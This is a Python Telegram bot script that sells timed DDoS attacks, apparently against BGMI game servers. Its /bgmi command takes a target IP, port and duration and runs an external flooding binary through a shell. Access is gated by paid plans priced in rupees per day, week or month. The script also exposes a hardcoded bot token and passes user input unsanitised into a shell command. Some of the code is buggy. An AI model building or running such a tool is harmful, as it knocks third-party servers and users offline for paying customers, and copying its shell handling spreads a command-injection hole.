#script by @MR_ARMAN_OWNER
#DEVELOPER BYE @MR_ARMAN_OWNER

import telebot
import subprocess
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7785961256:AAH-ZvbTRJAGifL0XFByle4oECQ-yq8GfOg
')

# Admin user IDs
admin_id = ["5997540330"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6050786012"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔"
            else:
                file.truncate(0)
                response = "𝘾𝙇𝙀𝘼𝙍 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 ✅"
    except FileNotFoundError:
        response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "𝙏𝙍𝙔 𝙏𝙊 𝘼𝘿𝘿 𝙐𝙎𝙀𝙍𝙎 𝘼𝘾𝘾𝙀𝙎𝙎 𝙏𝙄𝙈𝙀\n★[ʟɪᴋᴇ --> 1 ᴅᴀʏꜱ , 2 ᴅᴀʏꜱ , 1 ᴡᴇᴇᴋ]★"
    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @praveen123p"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>`{user_id}`</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙍𝙀𝙈𝙊𝙑𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👍"
            else:
                response = f"𝙐𝙎𝙀𝙍 𝘿𝘼𝙏𝘼 𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
        else:
            response = '''ᴛʀʏ ᴛᴏ ᴛʜɪꜱ ᴛʏᴘᴇ --> /ʀᴇᴍᴏᴠᴇ (ᴜꜱᴇʀ_ɪᴅ)'''
    else:
        response = "𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙉𝙊𝙏 FOR 𝙔𝙊𝙐"

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔"
                else:
                    file.truncate(0)
                    response = "𝘾𝙇𝙀𝘼𝙍 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 ✅"
        except FileNotFoundError:
            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
    else:
        response = "𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙉𝙊𝙏 𝙔𝙊𝙐"
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
                else:
                    file.truncate(0)
                    response = "𝘾𝙇𝙀𝘼𝙍 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 ✅"
        except FileNotFoundError:
            response = "𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔"
    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @praveen123p"
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
        except FileNotFoundError:
            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @praveen123p"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
                bot.reply_to(message, response)
        else:
            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
            bot.reply_to(message, response)
    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @praveen123p"
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚩𝐇𝐄𝐘 -> {username} \n🔺𝘼𝙏𝙏𝘼𝘾𝙆🔻1--> [𝐒𝐓𝐀𝐑𝐓𝐄𝐃]\n\n†αrgε† -> {target}\np⊕r† -> {port}\n†ïmε -> {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\ngαmε --> 🇮🇳🅑🅖🅜🅘🇮🇳\n\n彡[🚩]彡\n\n🚀 SEND FEEDBACK IN GROUP CHAT ✅\n\n🎯 @praveen123p 😎"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 1:
                response = "🛑ƈօօʟɖօառ ɮʀօ🛑"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 240:
                response = "⚠️ 𝐢𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭 ⚠️𝐦𝐮𝐬𝐭 𝐛𝐞 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 240."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./JUPITER {target} {port} {time} ", "./JUPITER {target} {port} {time} ", ". bgmi {target} {port} {time} 35"
                process = subprocess.run(full_command, shell=True)
                response = f"𝑫𝑬𝑨𝑹 𝑩𝑮𝑴𝑰 𝑷𝑳𝑨𝒀𝑬𝑹 {username}\n\nYOUR ATTACK FINISHED\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\nGAME :--> BGMIᎧᎮ ᭄\n🪂 𝙰𝙳𝚅𝙸𝙲𝙴 𝙰𝙱 𝚂𝙰𝙱𝙺𝙰 𝚃𝙷𝚄𝙼𝙰𝚁𝙰 𝙳a𝚃𝙰 𝚂𝙰𝙷𝙸 𝙷𝙾 𝙲𝙷𝚄𝙺𝙰 𝙷 𝙱𝙰𝙽𝙳𝙾 𝙺𝙾 𝙿𝙴𝙻𝙾 𝙰𝚄𝚁 𝙶𝚁𝙾𝚄𝙿 𝙼𝙴 𝚂𝙲𝚁𝙴𝙴𝙽𝚂𝙷𝙾𝚃 𝙳𝙾\n\n𝚆𝙴'𝚁𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙸𝙽𝙶 𝙰𝚁𝙴 𝙱𝙴𝚂𝚃 𝚂𝙴𝚁𝚅𝙸𝙲𝙴 𝙿𝙻𝙴𝙰𝚂𝙴 𝙱𝚄𝚈 𝚃𝙷𝙴 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝚃𝙾 𝙸𝙽𝚂𝚃𝙰𝙽 𝙰𝚃𝚃𝙰𝙲𝙺\n\n🎯 DM ME :--> @praveen123p"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "𝑫𝑬𝑨𝑹 DDOS 𝑷𝑳𝑨𝒀𝑬𝑹 {username} 🤗\n\n🚧 1 𝑹𝑬𝑨𝑫𝒀 𝑻𝑶 𝑼𝑺𝑬 🚧\n\n🤷🏻‍♀️ 𝙿𝙻𝙴𝙰𝚂𝙴 𝙴𝙽𝚃𝙴𝚁 /bgmi 🎯IP 🏇🏻𝙿𝙾𝚁𝚃 🏭𝚃𝙸𝙼𝙴 )\n\nFO‌R ‌E‌XAMPLE /bgmi 20.0.0.0 20865 180\n🚀 AFTER ATTACK  SEND FEEDBACK IN GROUP CHAT 👍🏻\n\n𝚆𝙴'𝚁𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙸𝙽𝙶 𝙰𝚁𝙴 𝙱𝙴𝚂𝚃 𝚂𝙴𝚁𝚅𝙸𝙲𝙴 𝙿𝙻𝙴𝙰𝚂𝙴 𝙱𝚄𝚈 𝚃𝙷𝙴 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝚃𝙾 𝙸𝙽𝚂𝚃𝙰𝙽 𝙰𝚃𝚃𝙰𝙲𝙺\n\DM ME IF U WANT TO BUY :---> @praveen123p"  # Updated command syntax
    else:
        response = ("ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @praveen123p")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿."
        except FileNotFoundError:
            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
    else:
        response = "ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @praveen123p"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
💥 /bgmi
💥 /rules
💥 /mylogs
💥 /plan 
💥 /myinfo

𝘽𝙪𝙮 :- @praveen123p
𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 :- PRIVATE 👀😂 AALSI A GYI TIH NHI DYA 😂😂
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏ𝙨 ʙᴏᴛ, {user_name}! ᴛʜɪ𝙨 ɪ𝙨 ʜɪɢʜ ǫᴜᴀʟɪᴛʏ 𝙨ᴇʀᴠᴇʀ ʙᴀ𝙨ᴇᴅ ᴅᴅᴏ𝙨. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇ𝙨𝙨.
🤖Try To Run This Command : /help 
✅BUY :- @praveen123p'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''𝙉𝙊 𝙍𝙐𝙇𝙀𝙎 🤗🤗'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''𝙃𝙚𝙮 - {user_name}

𝙑𝙞𝙥 🌟 :
-> 𝘼𝙩𝙩𝙖𝙘𝙠 𝙏𝙞𝙢𝙚 : 240 (𝙎)
> 𝘼𝙛𝙩𝙚𝙧 𝘼𝙩𝙩𝙖𝙘𝙠 𝙇𝙞𝙢𝙞𝙩 : 10 𝙨𝙚𝙘
-> 𝘾𝙤𝙣𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 : 2

𝙋𝙧-𝙞𝙘𝙚 𝙇𝙞𝙨𝙩💸 :
𝘿𝙖𝙮-->80 𝙍𝙨
𝙒𝙚𝙚𝙠-->400 𝙍𝙨
𝙈𝙤𝙣𝙩𝙝-->1000 𝙍𝙨
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


